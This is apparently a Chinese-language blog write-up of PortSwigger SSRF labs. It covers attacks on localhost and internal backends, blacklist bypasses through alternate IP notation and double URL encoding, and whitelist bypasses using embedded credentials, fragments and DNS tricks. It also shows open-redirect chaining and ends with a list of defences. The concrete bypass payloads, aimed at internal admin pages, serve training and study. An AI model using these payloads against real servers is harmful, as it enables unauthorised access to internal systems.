![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oRQJP2NfukoGTdDqgWp5DeyYOod67Rt60ibu9LxJuCSb5p4Riatkr9ykw/640?wx_fmt=png&from=appmsg "")  
# 七、Burp靶场  
## 针对本地的SSRF  
- 在针对服务器本身的SSRF攻击中，攻击者诱使应用程序通过其环回地址向托管应用程序的服务器发出HTTP请求，例如127.0.0.1  
或localhost  
。  
  
- 地址：  
https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost  
  
- 场景：一个购物应用程序允许用户查看某项商品是否在特定商店中有库存，该功能通过前端HTTP请求将URL传递给相关的后端API端点来实现。  
  
- 目标：通过SSRF漏洞访问服务器本地的的管理界面http://localhost/admin  
（绕过/admin  
的访问控制），并删除指定用户 carlos  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01obo3zuIf49JnmI0HadvMNxV6SUfib62Mv4SX8GMtlRIia4bubzHDt9UVQ/640?wx_fmt=png&from=appmsg "")  
- 查看商品的库存信息，抓包发送到Repeater  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01o4ANQdgOefJ6MdrUODSTarnqwkzUBNH5Cjaic3LjXmvn9M3dEobDIwqQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oIjQ5fS17ice8puP3xTzVbWxpicib3ic5cNe1zDDjgciasLr6XHJyUbicibYbQ/640?wx_fmt=png&from=appmsg "")  
- 在Repeater中发现，该功能通过前端HTTP请求将URL传递给相关的后端API端点来实现，这会导致服务器向指定的URL发出请求，检索库存状态并将其返回给用户  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oicewEgPTqnlIw3mMk35FMWd5hXsLKVKYvtibicgyv5RIJWeLsziaic9LK3w/640?wx_fmt=png&from=appmsg "")  
- 此时可以修改请求以指定服务器本身的本地URL，发现请求成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oRv53suCNckzazNEP6iaKCDicjLPdBJ31uYjr1TrYhlAVv0cdYqW3t2Yg/640?wx_fmt=png&from=appmsg "")  
- 管理功能通常只有经过身份验证的合适用户才能访问，因此直接访问URL的攻击者不会看到任何感兴趣的内容。但是，当对/admin  
的请求来自本地机器本身时，会绕过正常的访问控制。应用程序授予对管理功能的完全访问权限，因为该请求似乎来自受信任的位置。  
  
## 针对其它后端系统的SSRF  
- 服务器端请求伪造经常出现的一种信任关系是web服务器能够与内网的其他后端系统进行交互，这些后端系统通常是公网无法访问的的内网系统，这些内部后端系统包含敏感信息或者其它漏洞，通过SSRF漏洞就会造成任何能够与web服务器交互的人无需身份验证即可访问这些内网的系统。  
  
- 靶场地址：  
https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system  
  
- 场景：该靶场具有库存检查功能，可以从内部系统获取数据。  
  
- 目标：后端URL有一个管理界面（ip段为192.168.0.x，端口为8080，路径为/admin  
），通过SSRF漏洞访问这个内网的路径并删除用户carlos  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01o689xoaA6iaMVL4iaWicS60jHfSY4pv3MLF4ibm2W2qx6bX1z7SLrniaqdPQ/640?wx_fmt=png&from=appmsg "")  
- 查看商品的库存信息，使用Burp抓包  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oxhk3RsPxV3yN2UkYRVX6ZVzy3rAeibcuXJ3xvOYEYO82QyK4FdjlTEA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oaELb7CZwSPjtrmB8dBoJ8YdtotSXjw6hsRndJAC5CfbDERP1TfZlxw/640?wx_fmt=png&from=appmsg "")  
- 在Repeater中发现，该功能通过前端HTTP请求将URL传递给相关的后端API端点来实现，这会导致服务器向指定的URL发出请求，检索库存状态并将其返回给用户  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oK9HZRATnVrmiadkLxVGfiapRgVszMZCgqUKE5sOL2XMlzX5TdnY65jEw/640?wx_fmt=png&from=appmsg "")  
- 此时将数据包发送到Intruder，此时只知道ip段，所以修改URL请求任意内网主机8080端口的/admin  
路径，将主机位设置为变量，然后Payload设置为1-254，遍历整个内网，发现管理界面  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oJBEa0VRGHicEDkWW4adrojEFfvkjibfQUo6ETNfO45IsU5D7EN9PuFmw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oegF3PO1dSnabV2ZichCPw10QXcUyGKGcLXfX3IYq854BiciaUnVFZ52EQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oZz5GbfOI62oOJmraa5NBoAqYib3orUHibz2Tfnocyrs8oJN8Yvib3b9gw/640?wx_fmt=png&from=appmsg "")  
## 绕过黑名单  
- 一些应用程序会阻止包含127.0.0.1  
、localhost  
、/admin  
等等字符串中的一些关键字或者整个字符串，这种情况下，可以使用一些技术绕过黑名单  
  
- 使用替代IP表示127.0.0.1  
，例如：2130706433  
、017700000001  
或127.1  
。  
  
- 将自己的域名解析为127.0.0.1  
，然后请求自己的域名  
  
- 使用URL编码或大小写变体混淆被拦截/过滤的字符串。  
  
- 靶场地址：  
https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter  
  
- 目标：绕过黑名单限制，访问管理界面http://localhost/admin  
并删除指定用户carlos  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01o5xLcHREPakcqG2rHUiaXhSQf2BEXviaOAnqZQSdYhSnRDXetWNJJHV9A/640?wx_fmt=png&from=appmsg "")  
- 查看库存，使用Burp抓包，发送到Intruder  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01ooQoFeSdeFBDcXsPib1DYRvwibNn3ONEIn3XcFwichmzR51RPNsRQl0rMA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oibf2sNN5ZiczZ3kILNIS5ka2BuH2ibj5f1Kf9o2OVsVhKRicSO9UyJVHCA/640?wx_fmt=png&from=appmsg "")  
- 此时直接通过SSRF访问本地的管理界面发现被拦截  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oEr6e1DibpU3eIO6YrkxekfHtoHic9AfyxQvVAQu91oUh8bNVLF8zcNPg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01opYHZgtC6cND7iaicYM1gRNeria8z9xUez7OgFv902NTiaHN66uNBibLH6Ng/640?wx_fmt=png&from=appmsg "")  
- 通过双URL编码将“a”混淆为%25%36%31  
（http://loc%25%36%31lhost/%25%36%31dmin  
），发现防火墙未拦截，成功绕过黑名单限制  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oP3f2IbKEBuKCg6z9CyFp3l4kgiatbnIVAcaAA1S08uQelBeFgyogsicQ/640?wx_fmt=png&from=appmsg "")  
## 绕过白名单  
- 一些应用程序为了安全起见，只允许特定的、符合白名单规则的输入。例如：程序可能只接受来自某些特定主机（expected-host  
）的请求，如果应用程序在解析URL时存在问题或两次解析的结果不一致，就可能绕过白名单限制。  
  
- 可以对字符进行URL编码以混淆URL解析代码，如果实现过滤器的代码处理URL编码字符的方式不同于执行后端HTTP请求的代码，这或许也能绕过。  
  
- 甚至可以组合使用这些绕过方式  
  
- 在主机名之前的URL中嵌入凭据  
  
- 在URL中，可以在主机名之前使用@  
符号嵌入凭据。  
  
- 示例：https://expected-host@evil-host  
  
- 这里的expected-host  
是白名单允许的主机名，而evil-host  
 是攻击者控制的实际目标主机，某些解析器可能会将expected-host  
视为合法输入，但实际上请求会发送到evil-host  
。  
  
- 使用URL片段 (#  
)  
  
- URL中的#  
符号用于指示片段，通常不会被服务器处理，而是由浏览器客户端解析。  
  
- 示例：https://evil-host#expected-host  
  
- 应用程序可能只检查#  
后面的内容（即 expected-host  
），认为它符合白名单规则，实际请求仍然会发送到evil-host  
。  
  
- 利用DNS命名层次结构  
  
- DNS域名具有层次结构，子域名可以嵌套在父域名之下。  
  
- 示例：https://expected-host.evil-host  
  
- 这里的expected-host  
是白名单允许的主机名，但整个域名实际上是expected-host.evil-host  
，后者由攻击者控制，如果应用程序只简单地匹配expected-host  
，就可能误认为这是合法输入。  
  
- URL编码混淆  
  
- 攻击者可以通过对URL中的字符进行编码，来混淆解析器的行为。  
  
- 比如：原始URL为https://expected-host  
，编码后为https://%65%78%70%65%63%74%65%64-%68%6f%73%74  
  
- 如果应用程序实现过滤器的代码和执行HTTP请求的代码对URL编码的处理方式不同，就可能借此绕过限制。  
  
- 也可以将这些绕过方式组合使用  
  
- 靶场地址：  
https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter  
  
- 目标：绕过白名单限制，通过SSRF漏洞访问管理界面http://localhost/admin  
并删除用户carlos  
。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01os5fqiaSPLpegN55BVctVCUCZKK3xdsFJ9DCDnOeClFj0wiabkQalsWtQ/640?wx_fmt=png&from=appmsg "")  
- 查看库存，使用Burp抓包，发送到Repeater  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01o8JjiaKxibUicziadD5eTB66QItPKArLRfIO0EyMRHVBhMAStvKlhcWOsVQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oJuphOBHTicuW7PW1CXKwOlyxgZneu0oRVPRibiaMgHfFx2ka0yp844VRg/640?wx_fmt=png&from=appmsg "")  
- 此时直接通过SSRF访问本地的管理界面发现被拦截  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oPzXUQS0IQibA70Bq25pKb70MQFT2YdZnR9dDr8FhnickNvaibrGeB4ia0A/640?wx_fmt=png&from=appmsg "")  
- 将URL更改为http://username@stock.weliketoshop.net/  
，验证URL解析器是否支持嵌入式用户名；如果URL被接受，说明服务器的URL解析器支持嵌入式凭据，并且没有因额外的用户名部分而拒绝请求。  
  
- 此时的结果表明URL解析器支持嵌入式凭据  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01o4z3kr4Newl4oX1ziborvr0gLmiczszbTSDFoF0mgNbOQib2CdorVd8xNg/640?wx_fmt=png&from=appmsg "")  
- 在用户名中添加#  
，测试URL解析器对特殊字符的处理方式；如果URL被拒绝，说明服务器可能检测到非法字符并阻止了请求。  
  
- 此时发现被拒绝  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01o7UctWvE8qwVhkMvZibrP7yQ7B18aoJjXmImj3OzgMh23hnD97qOK8Sw/640?wx_fmt=png&from=appmsg "")  
- 将#  
编码为%2523  
的双URL，尝试绕过服务器对特殊字符的检测，如果服务器返回“Internal Server Error  
”，这表明服务器可能尝试连接到username  
。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01ojUAavntreuuPuoznQ7Ftz0tGicUfOTFJT3k2DiaSEkfBNrMyfoWmMLyA/640?wx_fmt=png&from=appmsg "")  
- 构造恶意URL访问管理界面，利用URL解析漏洞绕过白名单限制  
  
```
http://127.0.0.1%2523@stock.weliketoshop.net/admin/
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01o46TRhAhdcOBErWqRy0kT3vHrgHSh19hRKfJcqFOA4ttp1MMrS0RSdQ/640?wx_fmt=png&from=appmsg "")  
## 开放重定向绕过SSRF白名单  
- 开放重定向漏洞原理：该漏洞发生在应用程序允许用户通过URL参数控制页面跳转的场景，例如以下URL允许用户指定跳转地址，如果应用程序未正确验证 url  
 参数，攻击者可以将用户重定向到任意网站。  
  
```
http://example.com/redirect?url=http://malicious.com
```  
- 开放重定向漏洞绕过SSRF过滤器原理：假设服务器对SSRF请求的目标地址进行了严格的白名单过滤，但目标地址中包含一个开放重定向漏洞，攻击者可以利用该漏洞构造一个看似合法的URL，但实际上会触发重定向到攻击者指定的目标地址。  
  
- 靶场地址：  
https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection  
  
- 目标：绕过白名单限制，通过SSRF漏洞访问内网其它应用的管理界面http://192.168.0.12:8080/admin  
并删除用户carlos  
。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01o29IzLOIZW5Hicr2ibP5fdXxUOhw31xuia71y8EpHicTibyEKNZbKfib71kpA/640?wx_fmt=png&from=appmsg "")  
- 查看库存，使用Burp抓包，此时直接通过SSRF访问本地的管理界面发现被拦截  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01osnbqvDG2P4JtOgClYCcibcJzqichDa6a2kFXthApJ836acxNKoMxYKUg/640?wx_fmt=png&from=appmsg "")  
- 点击查看下一个产品，再用Burp抓包，发现通过path=  
参数重定向到另一个页面  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oQYtO8MxKIaPClr7dZ9BdPxNUvPTLXxug1LL1yAHhp57sIhZYfA8Acg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oiaibDlDDcJsuc8VNgH0sT06xA5hnApVgzxwKX8yTchxH3g3y3z0xTzPQ/640?wx_fmt=png&from=appmsg "")  
- 此时就可以创建一个利用开放重定向漏洞的URL，并重定向到管理界面  
  
```
/product/nextProduct?path=http://192.168.0.12:8080/admin
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/t88ugf2jgYDBFLXQBkuibL7k4ZbCyn01oIFAmgJKnDhkb60cBXPcZ0LdOcPN4jnYMLOubMeuZEQeM9k3ibCjKIyw/640?wx_fmt=png&from=appmsg "")  
# 八、防御方式  
- 禁止跳转  
  
- 过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件，那么在将返回结果展示给用户之前，先验证返回的信息是否符合标准。  
  
- 禁用不需要的协议，仅允许http和https请求，可以防止类似于攻击者使用伪协议引起的问题  
  
- 设置URL白名单或者限制内网IP（使用gethostbyname()  
判断是否为内网 IP）  
  
- 限制请求的端口为http常用的端口，比如80、443、8080、8090  
  
- 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。  
  
- 屏蔽返回信息：屏蔽返回的详细信息，防止攻击者利用返回的信息进行进一步的攻击。  
  
- 使用代理服务器：通过代理服务器来转发请求，这样即使攻击者能够构造伪造的请求，也无法直接访问到目标资源。  
  
- 验证和过滤目标地址：对请求的目标地址进行严格的验证和过滤，确保只有合法的地址才能被访问。  
  
